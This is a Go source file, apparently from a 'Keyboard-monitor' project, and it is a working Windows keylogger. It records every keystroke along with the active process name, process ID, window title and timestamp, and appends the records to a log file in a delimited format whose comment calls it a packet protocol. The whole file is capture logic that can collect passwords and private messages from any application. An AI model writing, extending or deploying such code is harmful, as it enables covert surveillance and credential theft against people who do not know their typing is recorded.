package main

import (
	"fmt"
	"github.com/BalconyJH/Keyboard-monitor/listener/win32"
	"log"
	"os"
	"strings"
	"time"
)

func keyDump(path string) {
	func() {
		var key string
		file, err := openFile(path)
		if err != nil {
			panic(err)
		}
		defer func() {
			file.Close()
			err := recover()
			log.Println(err)
		}()
		for {
			select {
			case event := <-kbEventChanel:
				vkCode := event.VkCode
				if keyMap[vkCode] == "Enter" || keyMap[vkCode] == "Tab" {
					if len(key) > 0 {
						fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time)
						fmt.Println(fmtStr)
						if err := writeToFile(file, fmtStr); err != nil {
							log.Println(err)
						}
						key = ""
					}
				} else {
					if vkCode >= 48 && vkCode <= 90 {
						if getCapsLockSate() { // 大小写
							key += strings.ToUpper(keyMap[vkCode])
						} else {
							key += keyMap[vkCode]
						}
					} else if isExKey(vkCode) {
						key += fmt.Sprintf("[%s]", keyMap[vkCode])
					} else {
						key += keyMap[vkCode]
					}
				}
			case event := <-msEventChanel:
				if len(key) > 0 {
					fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time)
					fmt.Println(fmtStr)
					if err := writeToFile(file, fmtStr); err != nil {
						log.Println(err)
					}
					key = ""
				}
			}
		}
	}()
}

func isExKey(vkCode win32.DWORD) bool {
	_, ok := exKey[vkCode]
	return ok
}

func fmtEventToString(keyStr string, processId uint32, processName string, windowText string, t time.Time) string {
	content := fmt.Sprintf("[%s:%d %s %s]\r\n%s\r\n", processName, processId,
		windowText, t.Format("15:04:05 2006/01/02"), keyStr)
	// 数据包协议 \t\r\n 结束
	return fmt.Sprintf("%s\t\r\n", content)
}

func writeToFile(file *os.File, str string) error {
	// write file
	if _, err := file.WriteString(str); err != nil {
		return err
	} else {
		err := file.Sync()
		if err != nil {
			return err
		}
	}
	return nil
}

func openFile(path string) (*os.File, error) {
	p := strings.Split(path, string(os.PathSeparator))
	if len(p) > 2 {
		// 创建目录
		dir := strings.Join(p[:len(p)-1], string(os.PathSeparator))
		err := os.MkdirAll(dir, os.ModePerm)
		if err != nil {
			return nil, err
		}
	}
	file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_RDWR|os.O_SYNC, 0644)
	if err != nil {
		return nil, err
	}
	//if exist, err := pathExists(path); err != nil{
	//	return nil , err
	//} else if ! exist { // 创建文件
	//	f , err := os.Create(path)
	//	if err != nil {
	//		return nil, err
	//	}
	//	f.Close()
	//}
	return file, nil
}

func pathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
